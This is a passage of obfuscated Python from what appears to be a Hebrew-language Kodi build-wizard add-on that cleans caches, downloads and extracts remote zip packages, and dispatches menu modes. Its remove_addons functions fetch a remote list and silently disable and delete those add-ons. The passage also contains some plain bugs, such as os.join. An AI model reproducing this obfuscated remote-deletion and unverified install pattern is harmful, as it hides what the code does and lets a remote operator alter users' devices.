			             if not (O00O000OOOOO0000O =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:4612
			              if not (O00O000OOOOO0000O =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:4613
			               if not (O00O000OOOOO0000O =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:4614
			                if not (O00O000OOOOO0000O =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:4615
			                 if not (O00O000OOOOO0000O =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:4616
			                  if not (O00O000OOOOO0000O =='plugin.video.neptune'and KEEPINFO =='true'):#line:4617
			                   if not (O00O000OOOOO0000O =='plugin.video.youtube'and KEEPINFO =='true'):#line:4618
			                    if not (O00O000OOOOO0000O =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:4619
			                     if not (O00O000OOOOO0000O =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:4620
			                       if not (O00O000OOOOO0000O =='service.subtitles.All_Subs'and KEEPINFO =='true'):#line:4622
			                           if not (O00O000OOOOO0000O =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:4626
			                            if not (O00O000OOOOO0000O =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:4627
			                             if not (O00O000OOOOO0000O =='plugin.video.torrenter'and KEEPINFO =='true'):#line:4628
			                              if not (O00O000OOOOO0000O =='plugin.video.quasar'and KEEPINFO =='true'):#line:4629
			                               if not (O00O000OOOOO0000O =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:4630
			                                  shutil .rmtree (os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),ignore_errors =True ,onerror =None )#line:4632
			if DP .iscanceled ():#line:4633
				DP .close ()#line:4634
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4635
				return False #line:4636
		DP .close ()#line:4637
		wiz .clearS ('build')#line:4638
		if over ==True :#line:4639
			return True #line:4640
		elif install =='restore':#line:4641
			return True #line:4642
		elif install :#line:4643
			buildWizard (install ,'normal',over =True )#line:4644
		else :#line:4645
			if INSTALLMETHOD ==1 :OO0OOOO000000OO0O =1 #line:4646
			elif INSTALLMETHOD ==2 :OO0OOOO000000OO0O =0 #line:4647
			else :OO0OOOO000000OO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:4648
			if OO0OOOO000000OO0O ==1 :wiz .reloadFix ('fresh')#line:4649
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:4650
	else :#line:4651
		if not install =='restore':#line:4652
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:4653
			wiz .refresh ()#line:4654
def clearCache ():#line:4659
		wiz .clearCache ()#line:4660
def fixwizard ():#line:4664
		wiz .fixwizard ()#line:4665
def totalClean ():#line:4667
		wiz .clearCache ()#line:4669
		wiz .clearPackages ('total')#line:4670
		clearThumb ('total')#line:4671
		cleanfornewbuild ()#line:4672
def cleanfornewbuild ():#line:4673
		try :#line:4674
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:4675
		except :#line:4676
			pass #line:4677
		try :#line:4678
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:4679
		except :#line:4680
			pass #line:4681
		try :#line:4682
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:4683
		except :#line:4684
			pass #line:4685
def clearThumb (type =None ):#line:4686
	O0OOO0O0000O0OOO0 =wiz .latestDB ('Textures')#line:4687
	if not type ==None :OO000O0O000O0O0OO =1 #line:4688
	else :OO000O0O000O0O0OO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,O0OOO0O0000O0OOO0 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:4689
	if OO000O0O000O0O0OO ==1 :#line:4690
		try :wiz .removeFile (os .join (DATABASE ,O0OOO0O0000O0OOO0 ))#line:4691
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (O0OOO0O0000O0OOO0 )#line:4692
		wiz .removeFolder (THUMBS )#line:4693
	else :wiz .log ('Clear thumbnames cancelled')#line:4695
	wiz .redoThumbs ()#line:4696
def purgeDb ():#line:4698
	OOOOOO000OOO0O0O0 =[];O0OO00O000OO0O0OO =[]#line:4699
	for OOO0000000OO00000 ,OOO00OO0OOOOOO0OO ,O0O0OOO0O0O00O0O0 in os .walk (HOME ):#line:4700
		for OOO0OOOOO000O0O00 in fnmatch .filter (O0O0OOO0O0O00O0O0 ,'*.db'):#line:4701
			if OOO0OOOOO000O0O00 !='Thumbs.db':#line:4702
				O00O0OO00O0OOO0O0 =os .path .join (OOO0000000OO00000 ,OOO0OOOOO000O0O00 )#line:4703
				OOOOOO000OOO0O0O0 .append (O00O0OO00O0OOO0O0 )#line:4704
				O000OOOOO0O0O0O0O =O00O0OO00O0OOO0O0 .replace ('\\','/').split ('/')#line:4705
				O0OO00O000OO0O0OO .append ('(%s) %s'%(O000OOOOO0O0O0O0O [len (O000OOOOO0O0O0O0O )-2 ],O000OOOOO0O0O0O0O [len (O000OOOOO0O0O0O0O )-1 ]))#line:4706
	if KODIV >=16 :#line:4707
		O0OO00000OO000OO0 =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0OO00O000OO0O0OO )#line:4708
		if O0OO00000OO000OO0 ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4709
		elif len (O0OO00000OO000OO0 )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4710
		else :#line:4711
			for O0000O0O0O0O000O0 in O0OO00000OO000OO0 :wiz .purgeDb (OOOOOO000OOO0O0O0 [O0000O0O0O0O000O0 ])#line:4712
	else :#line:4713
		O0OO00000OO000OO0 =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0OO00O000OO0O0OO )#line:4714
		if O0OO00000OO000OO0 ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4715
		else :wiz .purgeDb (OOOOOO000OOO0O0O0 [O0000O0O0O0O000O0 ])#line:4716
def fastupdatefirstbuild (O00O000OO00OO0O0O ):#line:4722
	xbmc .executebuiltin ((u'Notification(%s,%s)'%('Media Center','בודק אם קיים עדכון בשבילך')))#line:4723
	if ENABLE =='Yes':#line:4724
		if not NOTIFY =='true':#line:4725
			O0OOOOO0OO00000OO =wiz .workingURL (NOTIFICATION )#line:4726
			if O0OOOOO0OO00000OO ==True :#line:4727
				OOO00OO0OO000O000 ,OOOO0OO0OO0O00O0O =wiz .splitNotify (NOTIFICATION )#line:4728
				if not OOO00OO0OO000O000 ==False :#line:4730
					try :#line:4731
						OOO00OO0OO000O000 =int (OOO00OO0OO000O000 );O00O000OO00OO0O0O =int (O00O000OO00OO0O0O )#line:4732
						checkidupdate ()#line:4733
						wiz .setS ("notedismiss","true")#line:4734
						if OOO00OO0OO000O000 ==O00O000OO00OO0O0O :#line:4735
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OOO00OO0OO000O000 ),xbmc .LOGNOTICE )#line:4736
						elif OOO00OO0OO000O000 >O00O000OO00OO0O0O :#line:4738
							wiz .log ("[Notifications] id: %s"%str (OOO00OO0OO000O000 ),xbmc .LOGNOTICE )#line:4739
							wiz .setS ('noteid',str (OOO00OO0OO000O000 ))#line:4740
							wiz .setS ("notedismiss","true")#line:4741
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:4744
					except Exception as O0O0OOO0OO0000OOO :#line:4745
						wiz .log ("Error on Notifications Window: %s"%str (O0O0OOO0OO0000OOO ),xbmc .LOGERROR )#line:4746
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:4748
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O0OOOOO0OO00000OO ),xbmc .LOGNOTICE )#line:4749
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:4750
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:4751
def checkidupdate ():#line:4757
				wiz .setS ("notedismiss","true")#line:4759
				O00O00OOO0OO00000 =wiz .workingURL (NOTIFICATION )#line:4760
				O000000OOOOOOOO00 =" Kodi Premium"#line:4762
				OO00O0O0OOO0O0OOO =wiz .checkBuild (O000000OOOOOOOO00 ,'gui')#line:4763
				OO0000000OO0OO00O =O000000OOOOOOOO00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4764
				if not wiz .workingURL (OO00O0O0OOO0O0OOO )==True :return #line:4765
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4766
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O000000OOOOOOOO00 ),'','אנא המתן')#line:4767
				OOOOOOO00OOOO0O00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO0000000OO0OO00O )#line:4768
				try :os .remove (OOOOOOO00OOOO0O00 )#line:4769
				except :pass #line:4770
				logging .warning (OO00O0O0OOO0O0OOO )#line:4771
				if 'google'in OO00O0O0OOO0O0OOO :#line:4772
				   O0O0OOO0O0OO000O0 =googledrive_download (OO00O0O0OOO0O0OOO ,OOOOOOO00OOOO0O00 ,DP ,wiz .checkBuild (O000000OOOOOOOO00 ,'filesize'))#line:4773
				else :#line:4776
				  downloader .download (OO00O0O0OOO0O0OOO ,OOOOOOO00OOOO0O00 ,DP )#line:4777
				xbmc .sleep (100 )#line:4778
				OOOO000OOO0OO0O00 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000000OOOOOOOO00 )#line:4779
				DP .update (0 ,OOOO000OOO0OO0O00 ,'','אנא המתן')#line:4780
				extract .all (OOOOOOO00OOOO0O00 ,HOME ,DP ,title =OOOO000OOO0OO0O00 )#line:4781
				DP .close ()#line:4782
				wiz .defaultSkin ()#line:4783
				wiz .lookandFeelData ('save')#line:4784
				if INSTALLMETHOD ==1 :O00O00O0OO0OOOOOO =1 #line:4787
				elif INSTALLMETHOD ==2 :O00O00O0OO0OOOOOO =0 #line:4788
				else :DP .close ()#line:4789
def gaiaserenaddon ():#line:4791
  OO00OO00O0OO0OOO0 =(ADDON .getSetting ("gaiaseren"))#line:4792
  O0OOO0OOO000OO00O =(ADDON .getSetting ("rdbuild"))#line:4793
  if OO00OO00O0OO0OOO0 =='true'and O0OOO0OOO000OO00O =='true':#line:4794
    OO00O0O0O0OO00OOO =(NEWFASTUPDATE )#line:4795
    OO00O0O0O0O0000O0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:4796
    OOOOO00OOO00OO0OO =xbmcgui .DialogProgress ()#line:4797
    OOOOO00OOO00OO0OO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:4798
    OOO00000000OO000O =os .path .join (PACKAGES ,'isr.zip')#line:4799
    O00O00OO0OO00O0O0 =urllib2 .Request (OO00O0O0O0OO00OOO )#line:4800
    O0O00OOO0OOO00O0O =urllib2 .urlopen (O00O00OO0OO00O0O0 )#line:4801
    O00O0OO00OOO000O0 =xbmcgui .DialogProgress ()#line:4803
    O00O0OO00OOO000O0 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:4804
    O00O0OO00OOO000O0 .update (0 )#line:4805
    O0O000OO00O0OO0OO =open (OOO00000000OO000O ,'wb')#line:4807
    try :#line:4809
      OOO0000O0OO00OOOO =O0O00OOO0OOO00O0O .info ().getheader ('Content-Length').strip ()#line:4810
      OOOOO000O000OOO00 =True #line:4811
    except AttributeError :#line:4812
          OOOOO000O000OOO00 =False #line:4813
    if OOOOO000O000OOO00 :#line:4815
          OOO0000O0OO00OOOO =int (OOO0000O0OO00OOOO )#line:4816
    O000O0O0O0O0O0O0O =0 #line:4818
    OOOO000O00OOOOO0O =time .time ()#line:4819
    while True :#line:4820
          O000000OOO00000OO =O0O00OOO0OOO00O0O .read (8192 )#line:4821
          if not O000000OOO00000OO :#line:4822
              sys .stdout .write ('\n')#line:4823
              break #line:4824
          O000O0O0O0O0O0O0O +=len (O000000OOO00000OO )#line:4826
          O0O000OO00O0OO0OO .write (O000000OOO00000OO )#line:4827
          if not OOOOO000O000OOO00 :#line:4829
              OOO0000O0OO00OOOO =O000O0O0O0O0O0O0O #line:4830
          if O00O0OO00OOO000O0 .iscanceled ():#line:4831
             O00O0OO00OOO000O0 .close ()#line:4832
             try :#line:4833
              os .remove (OOO00000000OO000O )#line:4834
             except :#line:4835
              pass #line:4836
             break #line:4837
          OOOO000OO0OOO00O0 =float (O000O0O0O0O0O0O0O )/OOO0000O0OO00OOOO #line:4838
          OOOO000OO0OOO00O0 =round (OOOO000OO0OOO00O0 *100 ,2 )#line:4839
          OOOO0000O000OO0O0 =O000O0O0O0O0O0O0O /(1024 *1024 )#line:4840
          O0OO0OOOOOOO00O0O =OOO0000O0OO00OOOO /(1024 *1024 )#line:4841
          OOO000O0OO000000O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOO0000O000OO0O0 ,'teal',O0OO0OOOOOOO00O0O )#line:4842
          if (time .time ()-OOOO000O00OOOOO0O )>0 :#line:4843
            O000OOOOO0O0O000O =O000O0O0O0O0O0O0O /(time .time ()-OOOO000O00OOOOO0O )#line:4844
            O000OOOOO0O0O000O =O000OOOOO0O0O000O /1024 #line:4845
          else :#line:4846
           O000OOOOO0O0O000O =0 #line:4847
          OO000OO0000OO0OO0 ='KB'#line:4848
          if O000OOOOO0O0O000O >=1024 :#line:4849
             O000OOOOO0O0O000O =O000OOOOO0O0O000O /1024 #line:4850
             OO000OO0000OO0OO0 ='MB'#line:4851
          if O000OOOOO0O0O000O >0 and not OOOO000OO0OOO00O0 ==100 :#line:4852
              OO00OOO0OO00O0O0O =(OOO0000O0OO00OOOO -O000O0O0O0O0O0O0O )/O000OOOOO0O0O000O #line:4853
          else :#line:4854
              OO00OOO0OO00O0O0O =0 #line:4855
          O0OO00OO0OO0O0000 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O000OOOOO0O0O000O ,OO000OO0000OO0OO0 )#line:4856
          O00O0OO00OOO000O0 .update (int (OOOO000OO0OOO00O0 ),OOO000O0OO000000O ,O0OO00OO0OO0O0000 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:4858
    O0O00O0OO0O0OO0O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:4861
    O0O000OO00O0OO0OO .close ()#line:4864
    extract .all (OOO00000000OO000O ,O0O00O0OO0O0OO0O0 ,O00O0OO00OOO000O0 )#line:4865
    try :#line:4869
      os .remove (OOO00000000OO000O )#line:4870
    except :#line:4871
      pass #line:4872
def testnotify ():#line:4874
	OO00000OOOOOOOOO0 =wiz .workingURL (NOTIFICATION )#line:4875
	if OO00000OOOOOOOOO0 ==True :#line:4876
		try :#line:4877
			OO0O000OOO0O00OOO ,OO000OOOO0OOO000O =wiz .splitNotify (NOTIFICATION )#line:4878
			if OO0O000OOO0O00OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:4879
			if STARTP2 ()=='ok':#line:4880
				notify .notification (OO000OOOO0OOO000O ,True )#line:4881
		except Exception as OOOO0OOO0OO0O0000 :#line:4882
			wiz .log ("Error on Notifications Window: %s"%str (OOOO0OOO0OO0O0000 ),xbmc .LOGERROR )#line:4883
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:4884
def testnotify2 ():#line:4885
	OOO0O0O0O0000O0OO =wiz .workingURL (NOTIFICATION2 )#line:4886
	if OOO0O0O0O0000O0OO ==True :#line:4887
		try :#line:4888
			OOO000O000000O00O ,O00OO00O0O0O0000O =wiz .splitNotify (NOTIFICATION2 )#line:4889
			if OOO000O000000O00O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:4890
			if STARTP2 ()=='ok':#line:4891
				notify .notification2 (O00OO00O0O0O0000O ,True )#line:4892
		except Exception as O0OOOOOO0O000O0OO :#line:4893
			wiz .log ("Error on Notifications Window: %s"%str (O0OOOOOO0O000O0OO ),xbmc .LOGERROR )#line:4894
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:4895
def testnotify3 ():#line:4896
	O0000O00OO0000O0O =wiz .workingURL (NOTIFICATION3 )#line:4897
	if O0000O00OO0000O0O ==True :#line:4898
		try :#line:4899
			OO0000OO000O0O00O ,OO00OO0OO0000O0OO =wiz .splitNotify (NOTIFICATION3 )#line:4900
			if OO0000OO000O0O00O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:4901
			if STARTP2 ()=='ok':#line:4902
				notify .notification3 (OO00OO0OO0000O0OO ,True )#line:4903
		except Exception as O0O0OO0O0OO000000 :#line:4904
			wiz .log ("Error on Notifications Window: %s"%str (O0O0OO0O0OO000000 ),xbmc .LOGERROR )#line:4905
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:4906
def servicemanual ():#line:4907
	OO00OOO0OO0OO00O0 =wiz .workingURL (HELPINFO )#line:4908
	if OO00OOO0OO0OO00O0 ==True :#line:4909
		try :#line:4910
			OOO000O00O0OO0OOO ,OO0O000OO0O0OOO0O =wiz .splitNotify (HELPINFO )#line:4911
			if OOO000O00O0OO0OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:4912
			notify .helpinfo (OO0O000OO0O0OOO0O ,True )#line:4913
		except Exception as O00O0O000000O0O00 :#line:4914
			wiz .log ("Error on Notifications Window: %s"%str (O00O0O000000O0O00 ),xbmc .LOGERROR )#line:4915
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:4916
def testupdate ():#line:4918
	if BUILDNAME =="":#line:4919
		notify .updateWindow ()#line:4920
	else :#line:4921
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:4922
def testfirst ():#line:4924
	notify .firstRun ()#line:4925
def testfirstRun ():#line:4927
	notify .firstRunSettings ()#line:4928
def fastinstall ():#line:4931
	notify .firstRuninstall ()#line:4932
def addDir (O0OO0O00OO0O0OOO0 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:4939
	O00OO0O00O0O0OO0O =sys .argv [0 ]#line:4940
	if not mode ==None :O00OO0O00O0O0OO0O +="?mode=%s"%urllib .quote_plus (mode )#line:4941
	if not name ==None :O00OO0O00O0O0OO0O +="&name="+urllib .quote_plus (name )#line:4942
	if not url ==None :O00OO0O00O0O0OO0O +="&url="+urllib .quote_plus (url )#line:4943
	O000O000OOO00OO00 =True #line:4944
	if themeit :O0OO0O00OO0O0OOO0 =themeit %O0OO0O00OO0O0OOO0 #line:4945
	O0O0O000OO0OO0OO0 =xbmcgui .ListItem (O0OO0O00OO0O0OOO0 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:4946
	O0O0O000OO0OO0OO0 .setInfo (type ="Video",infoLabels ={"Title":O0OO0O00OO0O0OOO0 ,"Plot":description })#line:4947
	O0O0O000OO0OO0OO0 .setProperty ("Fanart_Image",fanart )#line:4948
	if not menu ==None :O0O0O000OO0OO0OO0 .addContextMenuItems (menu ,replaceItems =overwrite )#line:4949
	O000O000OOO00OO00 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O00OO0O00O0O0OO0O ,listitem =O0O0O000OO0OO0OO0 ,isFolder =True )#line:4950
	return O000O000OOO00OO00 #line:4951
def addFile (OO0O0O00O000O000O ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:4953
	O0O00O0OO00OOO0O0 =sys .argv [0 ]#line:4954
	if not mode ==None :O0O00O0OO00OOO0O0 +="?mode=%s"%urllib .quote_plus (mode )#line:4955
	if not name ==None :O0O00O0OO00OOO0O0 +="&name="+urllib .quote_plus (name )#line:4956
	if not url ==None :O0O00O0OO00OOO0O0 +="&url="+urllib .quote_plus (url )#line:4957
	OOO00OOO0O0O0O0OO =True #line:4958
	if themeit :OO0O0O00O000O000O =themeit %OO0O0O00O000O000O #line:4959
	OO0O0000O0OO0O0OO =xbmcgui .ListItem (OO0O0O00O000O000O ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:4960
	OO0O0000O0OO0O0OO .setInfo (type ="Video",infoLabels ={"Title":OO0O0O00O000O000O ,"Plot":description })#line:4961
	OO0O0000O0OO0O0OO .setProperty ("Fanart_Image",fanart )#line:4962
	if not menu ==None :OO0O0000O0OO0O0OO .addContextMenuItems (menu ,replaceItems =overwrite )#line:4963
	OOO00OOO0O0O0O0OO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0O00O0OO00OOO0O0 ,listitem =OO0O0000O0OO0O0OO ,isFolder =False )#line:4964
	return OOO00OOO0O0O0O0OO #line:4965
def get_params ():#line:4967
	OOOOO00O0O000OO00 =[]#line:4968
	OOO00O000OOOOOOOO =sys .argv [2 ]#line:4969
	if len (OOO00O000OOOOOOOO )>=2 :#line:4970
		O00OOOO0000000OOO =sys .argv [2 ]#line:4971
		OOO0OO00O0O000OO0 =O00OOOO0000000OOO .replace ('?','')#line:4972
		if (O00OOOO0000000OOO [len (O00OOOO0000000OOO )-1 ]=='/'):#line:4973
			O00OOOO0000000OOO =O00OOOO0000000OOO [0 :len (O00OOOO0000000OOO )-2 ]#line:4974
		O0O000OO0OOOO0OOO =OOO0OO00O0O000OO0 .split ('&')#line:4975
		OOOOO00O0O000OO00 ={}#line:4976
		for O0OO0OO00000000OO in range (len (O0O000OO0OOOO0OOO )):#line:4977
			O00OO00O0OOO00OO0 ={}#line:4978
			O00OO00O0OOO00OO0 =O0O000OO0OOOO0OOO [O0OO0OO00000000OO ].split ('=')#line:4979
			if (len (O00OO00O0OOO00OO0 ))==2 :#line:4980
				OOOOO00O0O000OO00 [O00OO00O0OOO00OO0 [0 ]]=O00OO00O0OOO00OO0 [1 ]#line:4981
		return OOOOO00O0O000OO00 #line:4983
def remove_addons ():#line:4985
	try :#line:4986
			import json #line:4987
			O000O0O00OO0O0O0O =urllib2 .urlopen (remove_url ).readlines ()#line:4988
			for O0000OO000O0O0000 in O000O0O00OO0O0O0O :#line:4989
				O0OO0O0OOO00OO00O =O0000OO000O0O0000 .split (':')[1 ].strip ()#line:4991
				OO00O000O00OOO00O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O0OO0O0OOO00OO00O ,'false')#line:4992
				OO000O000OOOOO0O0 =xbmc .executeJSONRPC (OO00O000O00OOO00O )#line:4993
				O0OO0O0O000O0O000 =json .loads (OO000O000OOOOO0O0 )#line:4994
				O0OOO0O0O00O0OOOO =os .path .join (addons_folder ,O0OO0O0OOO00OO00O )#line:4996
				if os .path .exists (O0OOO0O0O00O0OOOO ):#line:4998
					for OO0O00O000OOO000O ,O0OOOO0OO00O0OOO0 ,O0O00000000O0O0O0 in os .walk (O0OOO0O0O00O0OOOO ):#line:4999
						for O0OO0OO0OOO00OOO0 in O0O00000000O0O0O0 :#line:5000
							os .unlink (os .path .join (OO0O00O000OOO000O ,O0OO0OO0OOO00OOO0 ))#line:5001
						for O00O00O0OOOO0OOOO in O0OOOO0OO00O0OOO0 :#line:5002
							shutil .rmtree (os .path .join (OO0O00O000OOO000O ,O00O00O0OOOO0OOOO ))#line:5003
					os .rmdir (O0OOO0O0O00O0OOOO )#line:5004
			xbmc .executebuiltin ('Container.Refresh')#line:5006
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5007
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5008
	except :pass #line:5009
def remove_addons2 ():#line:5010
	try :#line:5011
			import json #line:5012
			OO0OOO0O00OOOOO0O =urllib2 .urlopen (remove_url2 ).readlines ()#line:5013
			for O0O0OOOOOO0OO0O0O in OO0OOO0O00OOOOO0O :#line:5014
				O0O0OOOO0OO0OO0OO =O0O0OOOOOO0OO0O0O .split (':')[1 ].strip ()#line:5016
				O000OO00OOO0OO00O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O0O0OOOO0OO0OO0OO ,'false')#line:5017
				O000OO0OO0OOOOO0O =xbmc .executeJSONRPC (O000OO00OOO0OO00O )#line:5018
				O00O0O000O000O0OO =json .loads (O000OO0OO0OOOOO0O )#line:5019
				O0000OO000OO00OOO =os .path .join (user_folder ,O0O0OOOO0OO0OO0OO )#line:5021
				if os .path .exists (O0000OO000OO00OOO ):#line:5023
					for O000OOO0O00OO00OO ,OOOO00O00OOOOO0OO ,O000O00O0OO0O0000 in os .walk (O0000OO000OO00OOO ):#line:5024
						for O0000O0O00O0OOOO0 in O000O00O0OO0O0000 :#line:5025
							os .unlink (os .path .join (O000OOO0O00OO00OO ,O0000O0O00O0OOOO0 ))#line:5026
						for OO0O0O000OO0OO0OO in OOOO00O00OOOOO0OO :#line:5027
							shutil .rmtree (os .path .join (O000OOO0O00OO00OO ,OO0O0O000OO0OO0OO ))#line:5028
					os .rmdir (O0000OO000OO00OOO )#line:5029
	except :pass #line:5031
params =get_params ()#line:5032
url =None #line:5033
name =None #line:5034
mode =None #line:5035
try :mode =urllib .unquote_plus (params ["mode"])#line:5037
except :pass #line:5038
try :name =urllib .unquote_plus (params ["name"])#line:5039
except :pass #line:5040
try :url =urllib .unquote_plus (params ["url"])#line:5041
except :pass #line:5042
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5044
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5045
def setView (OO00000OO000O0O00 ,O0OOO000OO0OOO000 ):#line:5046
	if wiz .getS ('auto-view')=='true':#line:5047
		O0000OO000000O0O0 =wiz .getS (O0OOO000OO0OOO000 )#line:5048
		if O0000OO000000O0O0 =='50'and KODIV >=17 and SKIN =='skin.estuary':O0000OO000000O0O0 ='55'#line:5049
		if O0000OO000000O0O0 =='500'and KODIV >=17 and SKIN =='skin.estuary':O0000OO000000O0O0 ='50'#line:5050
		wiz .ebi ("Container.SetViewMode(%s)"%O0000OO000000O0O0 )#line:5051
if mode ==None :index ()#line:5053
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5055
elif mode =='builds':buildMenu ()#line:5056
elif mode =='viewbuild':viewBuild (name )#line:5057
elif mode =='buildinfo':buildInfo (name )#line:5058
elif mode =='buildpreview':buildVideo (name )#line:5059
elif mode =='install':buildWizard (name ,url )#line:5060
elif mode =='theme':buildWizard (name ,mode ,url )#line:5061
elif mode =='viewthirdparty':viewThirdList (name )#line:5062
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5063
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5064
elif mode =='maint':maintMenu (name )#line:5066
elif mode =='passpin':passandpin ()#line:5067
elif mode =='backmyupbuild':backmyupbuild ()#line:5068
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5069
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5070
elif mode =='advancedsetting':advancedWindow (name )#line:5071
